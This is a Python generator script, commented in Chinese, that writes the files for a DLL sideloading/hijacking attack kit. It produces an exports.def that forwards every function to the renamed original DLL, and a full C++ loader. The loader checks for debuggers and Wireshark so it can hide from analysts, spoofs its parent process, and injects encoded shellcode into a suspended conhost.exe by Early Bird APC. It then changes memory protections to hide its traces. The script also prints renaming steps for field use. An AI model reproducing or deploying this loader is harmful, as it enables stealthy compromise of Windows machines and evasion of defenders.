import re
import sys
import os
import argparse

def generate_dllmain_cpp():
    """
    生成重构后的 dllmain.cpp (Early Bird APC + PPID Spoofing + 异步化)
    """
    cpp_template = """// dllmain.cpp - 重构版 (OS-Level Forwarding + Early Bird APC + PPID Spoofing)
#include <windows.h>
#include <tlhelp32.h>
#include <processthreadsapi.h>
#include <string.h>

// ==========================================================
// Payload 配置区 (在此放入 SGN 编码后的数据)
// ==========================================================
unsigned char payload[] = "";
unsigned int payload_len = sizeof(payload) - 1;

// ==========================================================
// 环境画像检查 (多字节字符集通用版)
// ==========================================================
bool IsSafeAndTargetEnvironment() {
    bool isServer = false;
    bool isAnalystPresent = false;

    // A. 常见的后端服务器进程白名单
    const char* serverProcs[] = {
        "java.exe", "javaw.exe", "w3wp.exe", "httpd.exe", "nginx.exe",
        "mysqld.exe", "sqlservr.exe", "php-cgi.exe", "node.exe", "BtSoft.exe"
    };

    // B. 常见的分析工具黑名单
    const char* analystProcs[] = {
        "x64dbg.exe", "x32dbg.exe", "Wireshark.exe", "ProcessHacker.exe",
        "Procmon.exe", "ida64.exe", "ollydbg.exe"
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = {};
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe)) {
            do {
                for (int i = 0; i < 7; i++) {
                    if (_stricmp(pe.szExeFile, analystProcs[i]) == 0) {
                        isAnalystPresent = true;
                        break;
                    }
                }
                if (isAnalystPresent) break;

                for (int i = 0; i < 10; i++) {
                    if (_stricmp(pe.szExeFile, serverProcs[i]) == 0) {
                        isServer = true;
                    }
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }

    if (isAnalystPresent) return false;

    // 兜底逻辑：为了测试方便，先锋马可以缩短时间或直接 return true;
    return true;
}

// ==========================================================
// 获取 explorer.exe 或 svchost.exe 的进程句柄 (用于 PPID 欺骗)
// ==========================================================
DWORD GetSpoofParentPID() {
    DWORD targetPID = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = {};
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe)) {
            do {
                // 优先选择 explorer.exe，其次 svchost.exe
                if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                    targetPID = pe.th32ProcessID;
                    break;
                }
                if (targetPID == 0 && _stricmp(pe.szExeFile, "svchost.exe") == 0) {
                    targetPID = pe.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }

    return targetPID;
}

// ==========================================================
// Early Bird APC 注入 + PPID 欺骗
// ==========================================================
void ExecuteEarlyBirdInjection() {
    if (payload_len <= 1) return;

    char targetPath[MAX_PATH];
    if (GetSystemDirectoryA(targetPath, MAX_PATH)) {
        strcat_s(targetPath, "\\\\conhost.exe");
    } else {
        return;
    }

    // ===== 步骤 1: PPID 欺骗 - 获取伪造的父进程句柄 =====
    DWORD spoofPID = GetSpoofParentPID();
    if (spoofPID == 0) return;

    HANDLE hSpoofParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoofPID);
    if (!hSpoofParent) return;

    // ===== 步骤 2: 初始化扩展的 STARTUPINFOEX 结构 =====
    SIZE_T attributeSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);

    LPPROC_THREAD_ATTRIBUTE_LIST pAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 0, attributeSize
    );
    if (!pAttributeList) {
        CloseHandle(hSpoofParent);
        return;
    }

    if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &attributeSize)) {
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hSpoofParent);
        return;
    }

    // ===== 步骤 3: 设置父进程属性 (PPID Spoofing 核心) =====
    if (!UpdateProcThreadAttribute(
        pAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hSpoofParent,
        sizeof(HANDLE),
        NULL,
        NULL
    )) {
        DeleteProcThreadAttributeList(pAttributeList);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hSpoofParent);
        return;
    }

    // ===== 步骤 4: 创建挂起的进程 (Early Bird 前提) =====
    STARTUPINFOEXA si = {};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.lpAttributeList = pAttributeList;

    PROCESS_INFORMATION pi = {};

    if (!CreateProcessA(
        NULL,
        targetPath,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &si.StartupInfo,
        &pi
    )) {
        DeleteProcThreadAttributeList(pAttributeList);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hSpoofParent);
        return;
    }

    // ===== 步骤 5: 在目标进程中分配 RWX 内存 =====
    void* remoteMem = VirtualAllocEx(
        pi.hProcess,
        NULL,
        payload_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!remoteMem) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        DeleteProcThreadAttributeList(pAttributeList);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hSpoofParent);
        return;
    }

    // ===== 步骤 6: 写入 Payload =====
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, remoteMem, payload, payload_len, &bytesWritten)) {
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        DeleteProcThreadAttributeList(pAttributeList);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hSpoofParent);
        return;
    }

    // ===== 步骤 7: 使用 QueueUserAPC 插入执行流 (Early Bird 核心) =====
    if (QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0)) {
        // ===== 步骤 8: 唤醒线程，触发 APC 执行 =====
        ResumeThread(pi.hThread);

        // 给 SGN 留出解密时间
        Sleep(500);

        // 权限翻转: RWX -> RX (抹除高危痕迹)
        DWORD oldProtect;
        VirtualProtectEx(pi.hProcess, remoteMem, payload_len, PAGE_EXECUTE_READ, &oldProtect);
    } else {
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
    }

    // 清理资源
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    DeleteProcThreadAttributeList(pAttributeList);
    HeapFree(GetProcessHeap(), 0, pAttributeList);
    CloseHandle(hSpoofParent);
}

// ==========================================================
// 后台线程入口 (防止 Loader Lock)
// ==========================================================
DWORD WINAPI BackgroundInjectionThread(LPVOID lpParam) {
    (void)lpParam;

    // 环境自检与注入
    if (IsSafeAndTargetEnvironment()) {
        ExecuteEarlyBirdInjection();
    }

    return 0;
}

// ==========================================================
// DLL 入口 (异步化，立即返回)
// ==========================================================
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    (void)lpReserved;
    (void)hModule;

    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        // 创建后台线程执行注入逻辑，立即返回 (防止阻塞宿主进程)
        HANDLE hThread = CreateThread(NULL, 0, BackgroundInjectionThread, NULL, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
    }

    return TRUE;
}
"""
    with open("dllmain.cpp", "w", encoding='utf-8') as f:
        f.write(cpp_template)
    return True

def generate_files(input_file, dll_base_name):
    """
    核心生成逻辑 (OS-Level Export Forwarding)
    """
    if not os.path.exists(input_file):
        print(f"\n[!] 错误: 找不到文件 '{input_file}'")
        return False

    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    except Exception as e:
        print(f"\n[!] 读取文件失败: {e}")
        return False

    # 正则提取函数名
    pattern = re.compile(r'extern\s+"C"\s+__declspec\(dllexport\).*?\s+(\w+)\s*\(')
    raw_func_names = pattern.findall(content)

    if not raw_func_names:
        print("\n[!] 警告: 在文件中未找到符合格式的导出函数。")
        return False

    # 过滤非法符号
    func_names = []
    for name in raw_func_names:
        if name.startswith("__imp_") or name.startswith("_imp_"):
            print(f"[-] 自动过滤非法数据符号: {name}")
            continue
        func_names.append(name)

    orig_dll_name_no_ext = f"{dll_base_name}_orig"

    # ===== 生成 exports.def (使用 OS-Level Forwarding) =====
    def_content = f'LIBRARY "{dll_base_name}"\nEXPORTS\n'
    for func in func_names:
        # 格式: 导出函数名=原DLL模块名.导出函数名 (不带 .dll 后缀)
        def_content += f"    {func}={orig_dll_name_no_ext}.{func}\n"

    with open("exports.def", "w") as f:
        f.write(def_content)

    # ===== 生成 dllmain.cpp =====
    generate_dllmain_cpp()

    print(f"\n[+] 编译套件生成成功！")
    print(f"    1. exports.def (OS-Level Forwarding)")
    print(f"    2. dllmain.cpp (Early Bird APC + PPID Spoofing + 异步化)")
    print(f"\n[!] 最终实战重命名指南:")
    print(f"    黑文件 (你编译的)  -> {dll_base_name}.dll")
    print(f"    白文件 (系统合法的)-> {orig_dll_name_no_ext}.dll")
    print(f"\n[!] 注意: 不再生成 proxy.asm 和 proxy_map.h，使用系统级转发")
    return True

def interactive_mode():
    print("="*50)
    print("  高级白加黑套件生成器 (OS-Level Forwarding)")
    print("="*50)

    while True:
        input_file = input("请输入导出函数列表文件路径 (例如 funcs.txt): ").strip().strip('"')
        if input_file:
            break
        print("路径不能为空。")

    default_name = "target"
    base_guess = os.path.splitext(os.path.basename(input_file))[0]
    if base_guess:
        default_name = base_guess

    dll_name = input(f"请输入目标 DLL 名称 (默认为 '{default_name}'): ").strip()
    if not dll_name:
        dll_name = default_name

    if dll_name.lower().endswith('.dll'):
        dll_name = dll_name[:-4]

    generate_files(input_file, dll_name)
    input("\n按回车键退出...")

def main():
    parser = argparse.ArgumentParser(description="生成完整的 DLL 劫持/代理/注入 工程文件 (重构版)")
    parser.add_argument("-u", "--input", help="包含 C++ 导出函数的文本文件路径")
    parser.add_argument("-n", "--name", help="目标 DLL 的名称 (不带后缀)")

    args = parser.parse_args()

    if args.input:
        input_file = args.input
        dll_name = args.name
        if not dll_name:
            dll_name = os.path.splitext(os.path.basename(input_file))[0]
        generate_files(input_file, dll_name)
    else:
        interactive_mode()

if __name__ == "__main__":
    main()
